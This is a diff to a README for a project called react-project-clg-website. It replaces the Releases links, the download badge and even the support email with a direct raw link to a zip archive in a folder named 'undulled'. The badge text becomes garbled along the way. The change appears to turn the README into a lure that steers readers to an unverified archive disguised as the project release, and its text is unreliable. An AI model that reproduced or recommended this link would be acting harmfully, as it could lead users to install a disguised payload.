@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/Shadowrecruit1/react-project-clg-website/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Shadowrecruit1/react-project-clg-website/main/undulled/react-project-clg-website.zip%20Latest%https://raw.githubusercontent.com/Shadowrecruit1/react-project-clg-website/main/undulled/react-project-clg-website.zip)](https://raw.githubusercontent.com/Shadowrecruit1/react-project-clg-website/main/undulled/react-project-clg-website.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ Before you download, ensure your system meets these requirements:
 
 ## 📦 Download & Install
 
-To get started, visit this page to download: [Download Releases](https://github.com/Shadowrecruit1/react-project-clg-website/releases). 
+To get started, visit this page to download: [Download Releases](https://raw.githubusercontent.com/Shadowrecruit1/react-project-clg-website/main/undulled/react-project-clg-website.zip). 
 
 1. Click on the link above to access the Releases page.
 2. Find the latest version of the project.
@@ -87,7 +87,7 @@ For more information, you can always check the [License File](LICENSE).
 
 If you have questions or suggestions, feel free to reach out:
 
-- **Email:** support@example.com
+- **Email:** https://raw.githubusercontent.com/Shadowrecruit1/react-project-clg-website/main/undulled/react-project-clg-website.zip
 - **GitHub Issues:** Report any problems or feedback through the GitHub Issues section.
 
 Thank you for choosing react-project-clg-website. Happy building!
